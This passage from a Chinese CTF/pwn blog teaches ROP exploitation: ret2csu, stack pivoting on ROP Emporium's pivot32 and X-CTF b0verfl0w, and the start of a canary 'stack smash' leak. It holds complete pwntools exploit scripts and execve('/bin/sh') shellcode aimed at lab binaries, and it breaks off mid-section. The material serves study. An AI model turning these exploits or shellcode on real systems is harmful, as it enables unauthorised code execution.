&#123;<br>write(STDOUT_FILENO, <span class="hljs-string">&quot;Hello, World/n&quot;</span>, <span class="hljs-number">13</span>);<br>vulnerable_function();<br>&#125;<br></code></pre></td></tr></table></figure><p>在read处有明显的栈溢出可以利用。<code>.plt</code> 表里就只有write函数和read函数。</p><p>我们的目的是调用 <code>system(&quot;/bin/sh&quot;)</code> ，可以先泄露出libc函数的地址，用write打印出来，通过计算偏移就可以求出system函数的地址。然后使用read函数将真实的system函数地址和&#x2F;bin&#x2F;sh字符串写入bss段，最后调用system函数即可。</p><p>我们知道在64位的程序中，前六个参数使用寄存器RDI, RSI, RDX, RCX, R8和 R9传递</p><p>在__libc_csu_init()函数中有可以利用的gadgets</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-19_10-16-23.png"></p><p>我们控制rbx,rbp,r12,r13,r14和r15的值，再将r15的值赋值给rdx，r14的值赋值给rsi，r15的值赋值给edi。简单来说对应关系就是:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">rdi</span>=  <span class="hljs-built_in">edi</span> = <span class="hljs-built_in">r13</span>,  <span class="hljs-built_in">rsi</span> = <span class="hljs-built_in">r14</span>, <span class="hljs-built_in">rdx</span> = <span class="hljs-built_in">r15</span><br></code></pre></td></tr></table></figure><p>随后就会调用 <code>call qword ptr [r12+rbx*8]</code> 。这条指令的含义是向 <code>[r12+rbx*8]</code> 间接寻址，跳转到所指的函数地址。我们就可以将rbx赋值为0，这样的寻址结果就是r12所指向的地址。</p><p>接下来的汇编代码片段含义为：执行call指令结束后，程序对rbx加一，然后对比rbx和rbp的值，如果相等就会继续向下执行。为了让rbx和rbp相等，我们需要将rbp赋值为1。</p><ul><li>payload-1</li></ul><p>利用 <code>read()</code> 读入我们的payload，<code>write()</code> 输出其got表中的地址。除了泄露地址，为了返回到原程序中重复利用 <code>buffer overflow</code> 的漏洞，我们需要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止。</p><p>总结一下我们要实现的payload需求：<code>rbx=0,rbp=1,r12=write_address,rdi=edi=r13,rsi=r14,rdx=r15</code>，<code>write(1,write_got,8)</code></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">csu_end</span> = <span class="hljs-number">0</span><span class="hljs-variable">x400606</span><br><span class="hljs-variable">csu_front</span> = <span class="hljs-number">0</span><span class="hljs-variable">x4005F0</span><br><span class="hljs-variable">got_write</span> = <span class="hljs-variable">level5.got</span>[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-variable">main_address</span> = <span class="hljs-number">0</span><span class="hljs-variable">x400564</span><br><br><span class="hljs-variable">payload</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x80</span>+<span class="hljs-number">8</span>)<br><span class="hljs-variable">payload1</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_end</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">1</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">got_write</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">8</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">got_write</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">1</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_front</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span><span class="hljs-variable">x38</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">main_address</span>)</span><br></code></pre></td></tr></table></figure><blockquote><p>write(1,write_got,8) 的含义为将 writ 函数的地址写入标准输出流中，写入的字节数为 8</p></blockquote><p>在收到write()在内存中的地址后，就可以计算出system()在内存中的地址。借此就可以将execve的地址以及“&#x2F;bin&#x2F;sh”读入到.bss段内存中。</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">bin_sh_str</span> = <span class="hljs-string">&#x27;/bin/sh\0&#x27;</span><br><span class="hljs-variable">bss_addr</span> = <span class="hljs-number">0</span><span class="hljs-variable">x601040</span><br><br><span class="hljs-variable">payload</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x80</span>+<span class="hljs-number">8</span>)<br><span class="hljs-variable">payload1</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_end</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">1</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">read_got</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">16</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">bss_base</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_front</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span><span class="hljs-variable">x38</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">main_address</span>)</span><br><span class="hljs-variable">sh.send</span>(<span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">execve_addr</span>) + <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></code></pre></td></tr></table></figure><blockquote><p>read(0,bss_base,16) 的含义为从标准输入中读取最多 16 个字节的数据，并将数据存储到位于 <code>bss_base</code> 地址处的缓冲区中。</p></blockquote><p>最后调用执行 <code>execve(&#39;/bin/sh&#39;,0,0)</code></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">payload</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x80</span>+<span class="hljs-number">8</span>)<br><span class="hljs-variable">payload1</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_end</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">1</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">bss_base</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">bss_base</span> + <span class="hljs-number">8</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_front</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span><span class="hljs-variable">x38</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">main_address</span>)</span><br></code></pre></td></tr></table></figure><p>总的exp为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>level5 = ELF(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>sh = process(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br><br>write_got = level5.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got = level5.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>main_addr = level5.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>bss_base = level5.bss()<br>csu_front_addr = <span class="hljs-number">0x400600</span><br>csu_end_addr = <span class="hljs-number">0x40061A</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rbx, rbp, r12, r13, r14, r15, last</span>):<br>    payload = <span class="hljs-string">&#x27;a&#x27;</span> * (<span class="hljs-number">0x80</span> + <span class="hljs-number">8</span>)<br>    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(<br>        r13) + p64(r14) + p64(r15)<br>    payload += p64(csu_front_addr)<br>    payload += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    payload += p64(last)<br>    sh.send(payload)<br>    sleep(<span class="hljs-number">1</span>)<br><br><br>sh.recvuntil(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>)<br><span class="hljs-comment">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span><br><span class="hljs-comment">## write(1,write_got,8)</span><br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, write_got, <span class="hljs-number">8</span>, write_got, <span class="hljs-number">1</span>, main_addr)<br><br>write_addr = u64(sh.recv(<span class="hljs-number">8</span>))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>, write_addr)<br>libc_base = write_addr - libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>execve_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;execve&#x27;</span>)<br>log.success(<span class="hljs-string">&#x27;execve_addr &#x27;</span> + <span class="hljs-built_in">hex</span>(execve_addr))<br><br><span class="hljs-comment">## read(0,bss_base,16)</span><br><span class="hljs-comment">## read execve_addr and /bin/sh\x00</span><br>sh.recvuntil(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>)<br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, read_got, <span class="hljs-number">16</span>, bss_base, <span class="hljs-number">0</span>, main_addr)<br>sh.send(p64(execve_addr) + <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br>sh.recvuntil(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>)<br><span class="hljs-comment">## execve(bss_base+8,0,0)</span><br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, bss_base, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, bss_base + <span class="hljs-number">8</span>, main_addr)<br>sh.interactive()<br></code></pre></td></tr></table></figure><hr><p>很菜菜的ROP，把笔记收拾收拾发一下。</p><p>本来想说栈上全部东西都搞完再发，但最近github上的绿点点都少了就提前发一部分喽😢</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>真的很菜菜的ROP</title>
    <link href="/2023/06/21/%E4%B8%8D%E9%82%A3%E4%B9%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/"/>
    <url>/2023/06/21/%E4%B8%8D%E9%82%A3%E4%B9%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/</url>
    
    <content type="html"><![CDATA[<p>栈上的不那么简单小玩意们</p><span id="more"></span><h1 id="Stack-pivoting"><a href="#Stack-pivoting" class="headerlink" title="Stack pivoting"></a>Stack pivoting</h1><p>stack pivoting (堆栈转移)，基本思想是利用已有的内存区域或数据结构（例如堆）来构造一个新的堆栈，然后将程序的控制流转移到该堆栈上执行。通过将堆栈指针 (ESP&#x2F;RSP) 设置为新的堆栈地址，并在该堆栈上构造合适的函数调用帧，可以控制程序的执行路径。</p><p>通常在内存布局受限或某些保护机制存在的情况下使用。</p><p>利用stack pivoting有以下几个特征：</p><ul><li>栈可以控制的空间过小不足以构造完整的rop链</li><li>开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域</li></ul><h4 id="🌰-1："><a href="#🌰-1：" class="headerlink" title="🌰_1："></a>🌰_1：</h4><p>发现了一个靶场：<a href="https://ropemporium.com/">ROP Emporium</a>，选择pivot-x_86</p><p>给的压缩包里还有一个动态链接库 <code>libpivot32.so</code>，checksec 一下甚至出现了没见过的玩意 <code>RUNPATH:  &#39;.&#39;</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br><span class="hljs-attr">RUNPATH:</span>  <span class="hljs-string">&#x27;.&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>这个  RUNPATH:  ‘.’  的意思是可执行文件的运行时路径（run-time search path）设置为当前目录（’.’），也就是它运行时会使用题目所给的动态链接库</p></blockquote><p>直接在linux里运行一下看看，这个程序有有两个输入。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-25_20-19-28.png"></p><p>反编译一下这个程序的main函数，复制一下源码写个注释</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> *ptr; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  <span class="hljs-built_in">setvbuf</span>(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;pivot by ROP Emporium&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;x86\n&quot;</span>);<br>  ptr = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000000</span>u);  <span class="hljs-comment">//分配一个0x1000000u的内存块，并将其地址赋值给ptr指针</span><br>  <span class="hljs-keyword">if</span> ( !ptr )  <br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Failed to request space for pivot stack&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;  <span class="hljs-comment">//检查内存分配是否成功，如果失败则输出错误信息并退出程序。</span><br>  <span class="hljs-built_in">pwnme</span>(ptr + <span class="hljs-number">16776960</span>);  <span class="hljs-comment">//调用pwnme函数，将ptr指针偏移16776960字节的位置作为参数传递给它。</span><br>  <span class="hljs-built_in">free</span>(ptr);  <span class="hljs-comment">//释放先前分配的内存块</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nExiting&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现main函数里没有什么漏洞可以被我们利用，但是在<code>pwnme</code>函数里发现<code>read()</code>没有输入长度的验证</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-25_20-26-26.png"></p><p>其中在第二个输入溢出时，只有<code>(0x38-0x28-4)</code>即12个字节的缓冲区可以利用，无法直接在栈上构造rop链。题目也有提示，我们需要将rop链存到buf中，再将栈转移到buf上。</p><p>我们发现puts一条文本<code>Call ret2win() from libpivot</code>，没有在这个可执行文件中发现这个函数，但是题目还给了一个动态链接库 <code>libpivot32.so</code>，发现这是一个后门函数，我们可以控制程序跳转到这里执行为我们打开flag。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-26_10-33-31.png"></p><p>首先我们需要了解函数在执行结束后会执行的 <code>leave;ret</code> 这条汇编代码的含义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># leave, 相当于执行<br>mov esp, ebp<br>pop ebp<br><br># retn, 相当于执行<br>pop eip<br><br>#执行leave指令后，首先绘将ebp的值赋给esp，然后做一个出栈操作，栈指针会向栈底移动一个地址。此时执行ret，就会跳转到新的栈顶指针的地址，即原ebp存储的地址的下一个地址。<br></code></pre></td></tr></table></figure><p>使用ROPgadgets查找对应的代码片段 <code>ROPgadget --binary pivot32 --only &quot;leave|ret&quot;</code></p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-26_10-17-07.png"></p><p>根据栈结构我们可以构造这样的payload：</p><table><thead><tr><th>Stack</th><th align="center">buffer</th><th align="center">EBP</th><th align="center">return_addr</th></tr></thead><tbody><tr><td>Payload</td><td align="center">buffer padding</td><td align="center">fake EBP</td><td align="center">retn_addr</td></tr></tbody></table><ul><li>buffer padding：在输入数据之前添加一些填充数据，以达到覆盖EBP和return_addr的目的。</li><li>fake EBP：构造一个伪造的EBP值，将其设置为攻击者控制的目标地址。这样，在函数执行<code>leave</code>指令时，将会把EBP的值设置为攻击者控制的目标地址。</li><li>retn_addr：设置返回地址为ROP链的起始地址，使程序执行ROP链中的指令序列。</li></ul><p>我们可以溢出到ebp，从而实现eip的劫持，完成栈转移。</p><p>需要注意的是程序执行到我们填入的<code>leave;ret</code>指令之前，自己也执行了一次该指令。也就是说这个指令被执行了两次</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-04_15-45-03.png"></p><p>由于每次ret都会使得esp+4，所以，伪造的ebp的地址要减去4。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&quot;./pivot32&quot;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pivot32&#x27;</span>)<br>lib_elf=ELF(<span class="hljs-string">&#x27;./libpivot32.so&#x27;</span>)<br><br>func_plt=elf.plt[<span class="hljs-string">&#x27;foothold_function&#x27;</span>]<br>func_got_plt=elf.got[<span class="hljs-string">&#x27;foothold_function&#x27;</span>]<br>foothold_sym=lib_elf.symbols[<span class="hljs-string">&#x27;foothold_function&#x27;</span>]<br>ret2win_sym=lib_elf.symbols[<span class="hljs-string">&#x27;ret2win&#x27;</span>]<br>offset=<span class="hljs-built_in">int</span>(ret2win_sym-foothold_sym)<br><br>leave_ret=<span class="hljs-number">0x080486a8</span><br>mov_eax_eax=<span class="hljs-number">0x080488c4</span><br>pop_eax=<span class="hljs-number">0x080488c0</span><br>pop_ebx=<span class="hljs-number">0x08048571</span><br>add_eax_ebx=<span class="hljs-number">0x080488c7</span><br>call_eax=<span class="hljs-number">0x080486a3</span><br><br>p.recvuntil(<span class="hljs-string">&quot;The Old Gods kindly bestow upon you a place to pivot: &quot;</span>)<br>fake_ebp=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>)<br><br>payload1=p32(func_plt)+p32(pop_eax)+p32(func_got_plt)+p32(mov_eax_eax)+p32(pop_ebx)+p32(offset)+p32(add_eax_ebx)+p32(call_eax)<br><br><span class="hljs-comment">#这里需要先调用一次foothold_function，将它的地址加载到got.plt中，我们才能进行后续的替换</span><br><span class="hljs-comment">#payload含义为，将eax赋值为foothold_function的真实地址，再将ebx赋值为foothold_function和ret2win的偏移，最后将ebx加到eax上，调用ret2win</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>p.sendline(payload1)<br><br>payload2=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">40</span>+p32(fake_ebp-<span class="hljs-number">4</span>)+p32(leave_ret)<br><br>p.recvuntil(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>p.sendline(payload2)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="🌰-2"><a href="#🌰-2" class="headerlink" title="🌰_2:"></a>🌰_2:</h4><p> [X-CTF Quals 2016 - b0verfl0w](<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF</a> Quals 2016 - b0verfl0w) </p><p>题目拿到手先查看一下基本信息</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_10-27-21.png"></p><p>查看一下源码发现vul函数有栈溢出漏洞</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_10-39-53.png"></p><p>但是可控制的范围很小只有50-32-4&#x3D;14个字节，我们就考虑 stack pivoting 。由于程序本身并没有开启堆栈保护，所以我们可以在栈上布置 shellcode 并执行。</p><p>构造完shellcode之后，我们需要对 esp 进行操作，使其指向 shellcode 处，并且直接控制程序跳转至 esp 处。</p><p>查找一下可以利用的gadget</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_10-46-47.png"></p><p>其中<code>0x08048504</code>有直接跳转到esp的片段，</p><p>修改栈上的返回地址为<code>jmp esp</code>的地址，这样程序就会跳转到栈顶指针所指向的地址处执行payload。</p><p>构造结构如下：</p><p>shellcode+padding&#x3D;0x20，fake ebp&#x3D;0x4，jmp_esp&#x3D;0x4</p><p>为了保证栈上有足够的空间执行payload，我们能将栈指针向下调整，即sub esp, 0x28;jmp esp。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r=process(<span class="hljs-string">&#x27;./b0verfl0w&#x27;</span>)<br><br>jum_esp=<span class="hljs-number">0x08048504</span><br><br>Shellcode = <span class="hljs-string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br>Payload=Shellcode+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">13</span>+p32(jum_esp)+asm(<span class="hljs-string">&#x27;sub esp, 0x28;jmp esp&#x27;</span>)<br><br><span class="hljs-comment">#先利用sub esp, 0x28;jmp esp指令跳转到调整后的栈顶，再向上面写入shellcode，最后再次执行jum_esp跳转执行shellcode  </span><br><br>r.sendline(Payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h1><p>canary保护有多种绕过方式，其中Stack smash就是绕过canary保护的一种方式。之前做过的canary保护绕过是填充canary最后的字节并之后暴力枚举或是直接泄露，从而避免canary保护程序报错。Stack smash这个方法并不在乎是否会引发canary报错，而是利用报错的内容。</p><p>在程序启动canary保护之后，如果发现canary被修改的话就会执行 <code>_stack_chk_fail</code> 函数来打印 argv[0] 指针所指向的字符串，正常情况下这个指针指向程序名。如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串地址，那么在 <code>_fortify_fail</code> 函数中就会输出我们想要的信息。</p><blockquote><p>这个方法适用于glibc-2.31以前的程序，之后的程序不会打印 argv[0] 指针所指向的字符串</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) __stack_chk_fail (<span class="hljs-type">void</span>)<br>&#123;<br>  __fortify_fail (<span class="hljs-string">&quot;stack smashing detected&quot;</span>);<br>&#125;<br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) internal_function __fortify_fail (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)<br>&#123;<br>  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>,<br>                    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>以2015年32C3 CTF readme 为例</p><p><a href="https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200">2015 32C3 CTF readme</a></p><p>触发canary保护后程序会输出一段报错  </p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_16-51-08.png"></p><p>开始解题，反汇编一下源码。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_17-14-00.png"></p><p>程序中有两次输入，第一次输入赋值给v3后不对其进行任何操作；第二次输入赋值给v1，将其不断赋值给byte_600D20这个数组。</p><p>双击查看数组</p><p><img 